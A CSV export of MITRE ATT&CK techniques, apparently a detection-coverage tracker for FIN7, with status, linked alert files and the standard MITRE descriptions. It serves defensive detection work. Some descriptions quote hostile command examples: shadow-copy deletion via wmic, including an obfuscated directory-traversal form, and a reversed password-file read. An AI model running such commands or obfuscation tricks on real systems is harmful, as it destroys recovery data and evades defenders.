Technique ID,Name,Tactics,Status,Linked Rule,Liczba wykryć,Author,Description,MITRE Link,ChangeHistory
T1005,Data from Local System,Collection,Pending,alerts\FIN7\T1005_Data_from_Local_System.html,,APT Matrix Generator,"Adversaries may search local system sources, such as file systems, configuration files, local databases, or virtual machine files, to find files of interest and sensitive data prior to Exfiltration.  Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system. ",https://attack.mitre.org/techniques/T1005/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1008,Fallback Channels,Command-And-Control,Pending,alerts\FIN7\T1008_Fallback_Channels.html,,APT Matrix Generator,Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.,https://attack.mitre.org/techniques/T1008/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1021.001,Remote Desktop Protocol,Lateral-Movement,Pending,alerts\FIN7\T1021.001_Remote_Desktop_Protocol.html,,APT Matrix Generator,Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.  Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)   Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware),https://attack.mitre.org/techniques/T1021/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1021.004,SSH,Lateral-Movement,Pending,alerts\FIN7\T1021.004_SSH.html,,APT Matrix Generator,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.  SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. On ESXi, SSH can be enabled either directly on the host (e.g., via `vim-cmd hostsvc/enable_ssh`) or via vCenter.(Citation: Sygnia ESXi Ransomware 2025)(Citation: TrendMicro ESXI Ransomware)(Citation: Sygnia Abyss Locker 2025) The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user (i.e., [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)).",https://attack.mitre.org/techniques/T1021/004/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1021.005,VNC,Lateral-Movement,Pending,alerts\FIN7\T1021.005_VNC.html,,APT Matrix Generator,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)  VNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)  Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)",https://attack.mitre.org/techniques/T1021/005/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1027.010,Command Obfuscation,Defense-Evasion,Pending,alerts\FIN7\T1027.010_Command_Obfuscation.html,,APT Matrix Generator,"Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE)  For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`“Wor”+“d.Application”`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017)  Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\voi\pcw\..\..\Windows\tei\qs\k\..\..\..\system32\erool\..\wbem\wg\je\..\..\wmic.exe shadowcopy delete`).(Citation: Twitter Richard WMIC)  Tools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)",https://attack.mitre.org/techniques/T1027/010/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1027.016,Junk Code Insertion,Defense-Evasion,Pending,alerts\FIN7\T1027.016_Junk_Code_Insertion.html,,APT Matrix Generator,"Adversaries may use junk code / dead code to obfuscate a malware’s functionality. Junk code is code that either does not execute, or if it does execute, does not change the functionality of the code. Junk code makes analysis more difficult and time-consuming, as the analyst steps through non-functional code instead of analyzing the main code. It also may hinder detections that rely on static code analysis due to the use of benign functionality, especially when combined with [Compression](https://attack.mitre.org/techniques/T1027/015) or [Software Packing](https://attack.mitre.org/techniques/T1027/002).(Citation: ReasonLabs)(Citation: ReasonLabs Cyberpedia Junk Code)  No-Operation (NOP) instructions are an example of dead code commonly used in x86 assembly language. They are commonly used as the 0x90 opcode. When NOPs are added to malware, the disassembler may show the NOP instructions, leading to the analyst needing to step through them.(Citation: ReasonLabs)  The use of junk / dead code insertion is distinct from [Binary Padding](https://attack.mitre.org/techniques/T1027/001) because the purpose is to obfuscate the functionality of the code, rather than simply to change the malware’s signature.   ",https://attack.mitre.org/techniques/T1027/016/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1033,System Owner/User Discovery,Discovery,Pending,alerts\FIN7\T1033_System_OwnerUser_Discovery.html,,APT Matrix Generator,"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  Various utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.  On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)",https://attack.mitre.org/techniques/T1033/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1036.004,Masquerade Task or Service,Defense-Evasion,Pending,alerts\FIN7\T1036.004_Masquerade_Task_or_Service.html,,APT Matrix Generator,"Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.  Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)",https://attack.mitre.org/techniques/T1036/004/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1036.005,Match Legitimate Resource Name or Location,Defense-Evasion,Pending,alerts\FIN7\T1036.005_Match_Legitimate_Resource_Name_or_Location.html,,APT Matrix Generator,"Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation.   This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.(Citation: Aquasec Kubernetes Backdoor 2023)",https://attack.mitre.org/techniques/T1036/005/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1047,Windows Management Instrumentation,Execution,Pending,alerts\FIN7\T1047_Windows_Management_Instrumentation.html,,APT Matrix Generator,"Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.  The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)  An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)  **Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being “disabled by default” on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)",https://attack.mitre.org/techniques/T1047/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1053.005,Scheduled Task,"Execution, Persistence, Privilege-Escalation",Pending,alerts\FIN7\T1053.005_Scheduled_Task.html,,APT Matrix Generator,"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)  An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)  Adversaries may also create ""hidden"" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",https://attack.mitre.org/techniques/T1053/005/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1059,Command and Scripting Interpreter,Execution,Pending,alerts\FIN7\T1059_Command_and_Scripting_Interpreter.html,,APT Matrix Generator,"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).  There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).  Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)",https://attack.mitre.org/techniques/T1059/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1059.001,PowerShell,Execution,Tested,alerts\FIN7\T1059.001_PowerShell.html,,APT Matrix Generator,"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).  PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.  A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)  PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",https://attack.mitre.org/techniques/T1059/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1059.003,Windows Command Shell,Execution,Pending,alerts\FIN7\T1059.003_Windows_Command_Shell.html,,APT Matrix Generator,"Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)  Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.  Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",https://attack.mitre.org/techniques/T1059/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1059.005,Visual Basic,Execution,Pending,alerts\FIN7\T1059.005_Visual_Basic.html,,APT Matrix Generator,"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)  Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)  Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )",https://attack.mitre.org/techniques/T1059/005/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1059.007,JavaScript,Execution,Pending,alerts\FIN7\T1059.007_JavaScript.html,,APT Matrix Generator,"Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)  JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)  JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)  Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",https://attack.mitre.org/techniques/T1059/007/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1069.002,Domain Groups,Discovery,Pending,alerts\FIN7\T1069.002_Domain_Groups.html,,APT Matrix Generator,"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.  Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",https://attack.mitre.org/techniques/T1069/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1071.004,DNS,Command-And-Control,Pending,alerts\FIN7\T1071.004_DNS.html,,APT Matrix Generator,"Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.   The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) ",https://attack.mitre.org/techniques/T1071/004/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1078,Valid Accounts,"Defense-Evasion, Initial-Access, Persistence, Privilege-Escalation",Pending,alerts\FIN7\T1078_Valid_Accounts.html,,APT Matrix Generator,"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.  In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)  The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",https://attack.mitre.org/techniques/T1078/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1078.003,Local Accounts,"Defense-Evasion, Initial-Access, Persistence, Privilege-Escalation",Tested,alerts\FIN7\T1078.003_Local_Accounts.html,,APT Matrix Generator,"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.  Local Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ",https://attack.mitre.org/techniques/T1078/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1091,Replication Through Removable Media,"Initial-Access, Lateral-Movement",Pending,alerts\FIN7\T1091_Replication_Through_Removable_Media.html,,APT Matrix Generator,"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.  Mobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",https://attack.mitre.org/techniques/T1091/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
